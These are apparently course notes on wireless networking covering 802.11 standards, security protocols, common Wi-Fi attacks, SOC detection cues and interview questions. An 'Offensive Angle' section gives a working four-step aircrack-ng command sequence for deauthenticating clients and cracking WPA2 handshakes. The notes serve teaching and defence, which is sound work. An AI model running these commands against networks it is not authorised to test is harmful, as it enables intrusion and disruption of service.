# Lecture 10: Wireless Networking
Date: May 19, 2026
Source: NetworkChuck Free CCNA

## Wireless Network Types
| Type | Coverage | Example |
|------|----------|---------|
| WLAN | Building | Home/office Wi-Fi |
| WPAN | Personal area | Bluetooth |
| WMAN | City area | WiMAX |
| WWAN | Wide area | 4G/5G |

## IEEE 802.11 Standards
| Standard | Frequency | Max Theoretical Speed |
|----------|-----------|-----------------------|
| 802.11b | 2.4 GHz | 11 Mbps |
| 802.11g | 2.4 GHz | 54 Mbps |
| 802.11n | 2.4/5 GHz | 600 Mbps |
| 802.11ac | 5 GHz | 1+ Gbps |
| 802.11ax (Wi-Fi 6) | 2.4/5/6 GHz depending on variant | Up to 9.6 Gbps |

## 2.4 GHz vs 5 GHz
| Feature | 2.4 GHz | 5 GHz |
|---------|---------|-------|
| Range | Longer | Shorter |
| Speed | Slower | Faster |
| Interference | More | Less |
| Wall Penetration | Better | Weaker |

## Wireless Security Protocols
| Protocol | Security | Status |
|----------|----------|--------|
| WEP | Weak | Broken |
| WPA | Medium | Old |
| WPA2 | Strong | Common |
| WPA3 | Strongest | Modern |

## Offensive Angle
### Common Wireless Attacks
| Attack | Description | Tool Example |
|--------|-------------|--------------|
| Evil Twin | Fake AP steals credentials | hostapd-wpe |
| Deauth Attack | Disconnects users from Wi-Fi | aireplay-ng |
| WPA Handshake Capture | Captures handshake for offline cracking | airodump-ng |
| Rogue AP | Unauthorized AP inside a network | WIDS/WIPS can detect |
| Packet Sniffing | Captures wireless traffic | Wireshark |

### WPA2 Cracking Process
```bash
# Step 1: Enable monitor mode
airmon-ng start wlan0

# Step 2: Capture handshake
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX wlan0mon

# Step 3: Deauth to force handshake
aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# Step 4: Crack with wordlist
aircrack-ng capture.cap -w /usr/share/wordlists/rockyou.txt
```

## SOC Detection
| Attack | Detection |
|--------|-----------|
| Evil Twin | Duplicate SSID or suspicious BSSID |
| Rogue AP | Unknown AP or unknown MAC on wireless network |
| Deauth Attack | Flood of deauth frames |
| Packet Sniffing | Difficult to detect directly; use WIDS/WIPS signals where available |
| WPA Cracking | Deauth activity followed by handshake capture patterns |

## Interview Questions
**Q: What is an Evil Twin attack?**
An attacker creates a fake Wi-Fi access point with the same or similar name as the legitimate network.
Victims may connect to it and expose credentials or traffic.

**Q: Why is WEP insecure?**
WEP uses weak cryptography and poor key management.
It can be cracked quickly with common tools.

**Q: What is the difference between WPA2 and WPA3?**
WPA3 uses SAE instead of the traditional WPA2-PSK handshake.
It improves resistance to offline dictionary attacks and gives better protection on open networks.
